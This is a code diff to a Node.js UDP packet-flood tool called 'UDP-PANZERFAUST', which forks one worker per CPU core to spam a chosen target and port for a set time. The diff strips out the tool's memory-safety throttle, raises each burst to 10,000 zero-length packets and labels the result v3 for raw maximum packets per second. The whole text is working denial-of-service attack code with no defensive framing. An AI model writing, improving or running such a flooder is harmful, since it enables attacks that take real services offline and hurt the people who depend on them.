@@ -12,23 +12,19 @@ if (!target || isNaN(duration)) {
 }
 
 const endTime = Date.now() + duration * 1000;
-const payload = Buffer.alloc(1); // 1-byte = max PPS
 const cpuCount = os.cpus().length;
-
-const SAFE_CPU_THRESHOLD = 90; // %
-const SAFE_MEM_THRESHOLD = 85; // %
+const payload = Buffer.alloc(0); // zero-length payload for max PPS
 
 if (cluster.isMaster) {
   let totalSent = 0;
   let maxPPS = 0;
 
   console.clear();
-  console.log('UDP-PANZERFAUST [PPS FOCUSED + SAFETY]');
-  console.log('--------------------------------------');
+  console.log('UDP-PANZERFAUST v3 [RAW MAX PPS, ZERO PAYLOAD]');
+  console.log('----------------------------------------------');
   console.log(`Target: ${target}:${port}`);
   console.log(`Duration: ${duration}s`);
-  console.log(`Cores: ${cpuCount}`);
-  console.log('Launching...\n');
+  console.log(`Cores: ${cpuCount}\nStarting...\n`);
 
   for (let i = 0; i < cpuCount; i++) cluster.fork();
 
@@ -43,14 +39,14 @@ if (cluster.isMaster) {
 
   setInterval(() => {
     console.clear();
-    console.log('UDP-PANZERFAUST [PPS FOCUSED + SAFETY]');
-    console.log('--------------------------------------');
-    console.log(`Total Packets Sent: ${totalSent}`);
-    console.log(`Max PPS: ${maxPPS}`);
+    console.log('UDP-PANZERFAUST v3 [RAW MAX PPS, ZERO PAYLOAD]');
+    console.log('----------------------------------------------');
+    console.log(`Total Packets Sent: ${totalSent.toLocaleString()}`);
+    console.log(`Max PPS (last 1s): ${maxPPS.toLocaleString()}`);
     console.log(`Target: ${target}:${port}`);
-    console.log('--------------------------------------');
+    console.log('----------------------------------------------');
     maxPPS = 0;
-  }, 2000);
+  }, 1000);
 
   setTimeout(() => {
     console.log('\nAttack complete.');
@@ -62,40 +58,18 @@ if (cluster.isMaster) {
   const sock = dgram.createSocket('udp4');
   let sent = 0;
   let pps = 0;
-  let isThrottled = false;
-
-  function systemSafe() {
-    const mem = process.memoryUsage();
-    const usedMB = mem.rss / 1024 / 1024;
-    const totalMB = os.totalmem() / 1024 / 1024;
-    const usagePercent = (usedMB / totalMB) * 100;
-    return usagePercent < SAFE_MEM_THRESHOLD;
-  }
 
   function spam() {
-    function sendLoop() {
-      if (Date.now() > endTime) return;
+    if (Date.now() > endTime) return;
 
-      if (!isThrottled && systemSafe()) {
-        for (let i = 0; i < 1000; i++) {
-          sock.send(payload, 0, payload.length, port, target, () => {
-            sent++;
-            pps++;
-          });
-        }
-        setImmediate(sendLoop);
-      } else {
-        if (!isThrottled) {
-          isThrottled = true;
-          setTimeout(() => {
-            isThrottled = false;
-          }, 10000); // throttle for 10s
-        }
-        setTimeout(sendLoop, 100); // slowdown
-      }
+    for (let i = 0; i < 10000; i++) { // blast 10k packets per tick
+      sock.send(payload, 0, payload.length, port, target, () => {
+        sent++;
+        pps++;
+      });
     }
 
-    sendLoop();
+    setImmediate(spam);
   }
 
   setInterval(() => {
